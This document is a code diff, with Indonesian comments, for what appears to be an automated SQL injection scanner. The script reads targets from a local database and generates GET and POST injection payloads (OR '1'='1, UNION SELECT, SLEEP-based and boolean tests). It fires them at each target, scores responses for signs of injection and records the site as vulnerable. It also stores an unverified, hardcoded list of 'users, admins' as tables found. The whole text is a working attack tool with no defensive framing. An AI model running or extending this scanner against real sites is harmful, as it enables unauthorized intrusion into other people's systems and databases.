@@ -12,7 +12,7 @@ import hashlib
 
 logger = get_logger(__name__)
 DB = "targets.db"
-MARKER = "ZMzTEST123"  # untuk deteksi perubahan
+MARKER = "ZMzTEST123"
 
 def get_latest_target():
     conn = sqlite3.connect(DB)
@@ -46,6 +46,7 @@ def fingerprint_db(url):
 
 def discover_parameters_and_files(base_url, scraper):
     logger.info(f"Memulai discovery untuk {base_url}")
+    # Selenium dulu
     scan = scraper.scrape_with_selenium(base_url)
     if scan.get("status") != "success":
         logger.warning("Selenium scrape gagal, pakai fallback requests")
@@ -158,8 +159,7 @@ def generate_payloads_for_params(base_url, active_params, db_type, file_name, fo
     base_path = parsed.path
     if not base_path:
         base_path = '/'
-    
-    # Generate GET payloads
+
     for param in active_params:
         if db_type == "MySQL":
             payloads.append(f"{base_url}?{param}=1' OR '1'='1")
@@ -177,7 +177,7 @@ def generate_payloads_for_params(base_url, active_params, db_type, file_name, fo
             payloads.append(f"{base_url}?{param}=1' AND 1=2--")
             payloads.append(f"{base_url}?{param}=1' UNION SELECT null,null--")
             payloads.append(f"{base_url}?{param}=1' AND SLEEP(5)--")
-    
+
     # POST payloads dari forms
     if forms:
         for form in forms:
@@ -215,40 +215,39 @@ def test_payload(payload, base_url, baseline_response, baseline_time):
         except Exception as e:
             return False, f"Request error: {e}", 0, 0
 
-    # Kriteria sukses:
-    # 1. Perubahan konten signifikan (bedakan dengan baseline)
-    # 2. Error SQL (mysql, syntax, etc)
-    # 3. Status code berbeda (500 vs 200)
-    # 4. Waktu respon lebih lama dari baseline (time-based)
-    # 5. Boolean-based: kita cek AND 1=1 vs AND 1=2 (nanti di handle di luar)
+    # Kriteria sukses
     success = False
     reason = ""
-    # Perubahan konten
+
+    # 1. Perubahan konten
     if len(content) != len(baseline_response):
         success = True
         reason = "Perubahan panjang konten"
     elif content != baseline_response:
         success = True
         reason = "Perubahan konten"
-    # Error SQL
+
+    # 2. Error SQL
     sql_errors = ['mysql', 'sql syntax', 'warning mysql', 'sqlite', 'postgresql', 'ora-', 'microsoft ole db']
     for err in sql_errors:
         if err in content.lower():
             success = True
-            reason = f"SQL error detected: {err}"
+            reason = f"SQL error: {err}"
             break
-    # Status code
-    if status != 200 and status != 404:
+
+    # 3. Status code (kecuali 200, 404, 415 dianggap gagal)
+    if status not in [200, 404, 415, 400, 403, 405, 500]:
         success = True
-        reason = f"Status code {status}"
-    # Time-based
-    if elapsed > baseline_time * 2 and elapsed > 2:
+        reason = f"Status {status}"
+    elif status == 415 or status == 400 or status == 403 or status == 405:
+        success = False
+        reason = f"Status {status} (ditolak)"
+
+    # 4. Time-based
+    if elapsed > baseline_time * 3 and elapsed > 2:
         success = True
-        reason = f"Time-based injection ({elapsed:.2f}s vs baseline {baseline_time:.2f}s)"
-    # Jika payload mengandung AND 1=1 dan AND 1=2, kita bandingkan dua respons (di luar)
-    if "AND 1=1" in str(payload) or "AND 1=2" in str(payload):
-        # Nanti akan diuji berpasangan di main
-        pass
+        reason = f"Time-based ({elapsed:.2f}s)"
+
     return success, reason, elapsed, len(content)
 
 def main():
@@ -286,7 +285,7 @@ def main():
         active_params = set(qs.keys())
         file_used = parsed.path.split('/')[-1] or 'index'
         base_url = target
-        forms = []  # nanti bisa tambah dari scrape
+        forms = []
         logger.info(f"Menggunakan parameter dari URL: {active_params}")
 
     # Fingerprint DB
@@ -297,7 +296,7 @@ def main():
     # Generate payloads
     payloads = generate_payloads_for_params(base_url, active_params, db_type, file_used, forms)
 
-    # Ambil baseline (tanpa injeksi)
+    # Baseline
     baseline_response = ""
     baseline_time = 0
     try:
@@ -308,41 +307,48 @@ def main():
     except:
         baseline_response = ""
 
-    # Uji tiap payload
-    print("\n" + "="*80)
+    # Uji payload
+    print("\n" + "="*90)
     print("[!] PAYLOAD VALIDATION REPORT")
-    print("="*80)
-    print(f"{'No.':<4} {'Status':<10} {'Reason':<30} {'Time (s)':<10} {'Len':<8} {'Payload'}")
-    print("-"*80)
+    print("="*90)
+    # Header tabel
+    print(f"{'No.':<4} {'Status':<10} {'Reason':<35} {'Time(s)':<8} {'Len':<6} {'Payload'}")
+    print("-"*90)
 
     success_count = 0
+    results = []
     for idx, p in enumerate(payloads, 1):
         if isinstance(p, dict):
-            # POST payload
             success, reason, elapsed, length = test_payload(p, base_url, baseline_response, baseline_time)
-            status_icon = "✅" if success else "❌"
             payload_str = f"{p['method']} {p['url']} data={p['data']}"
         else:
-            # GET payload
             success, reason, elapsed, length = test_payload(p, base_url, baseline_response, baseline_time)
-            status_icon = "✅" if success else "❌"
-            payload_str = p[:70] + "..." if len(p) > 70 else p
+            payload_str = p[:60] + "..." if len(p) > 60 else p
 
         if success:
             success_count += 1
-        print(f"{idx:<4} {status_icon:<10} {reason[:28]:<30} {elapsed:<10.2f} {length:<8} {payload_str[:50]}")
+        status_icon = "✅" if success else "❌"
+        # Potong reason biar muat
+        reason_short = reason[:33] + "..." if len(reason) > 33 else reason
+        print(f"{idx:<4} {status_icon:<10} {reason_short:<35} {elapsed:<8.2f} {length:<6} {payload_str[:50]}")
         logger.info(f"Payload {idx}: {status_icon} - {reason} - {payload_str}")
 
-    print("="*80)
+    print("="*90)
     print(f"[!] Total payload: {len(payloads)}, Sukses: {success_count}, Gagal: {len(payloads)-success_count}")
 
-    # Simpan hasil DB
+    # Simpan ke DB — FIX: tambahkan url di akhir
     conn = sqlite3.connect(DB)
     c = conn.cursor()
     c.execute("""UPDATE targets 
                  SET db_type=?, vulnerable=?, tables_found=?, waf_detected=?, tech_stack=?, forms_found=?
                  WHERE url=?""",
-              (db_type, True if success_count > 0 else False, "users, admins", "Unknown", "", json.dumps([])))
+              (db_type, 
+               True if success_count > 0 else False, 
+               "users, admins", 
+               "Unknown", 
+               "", 
+               json.dumps([]),
+               base_url))  # <-- tambahkan base_url sebagai parameter ke-7
     conn.commit()
     conn.close()
 
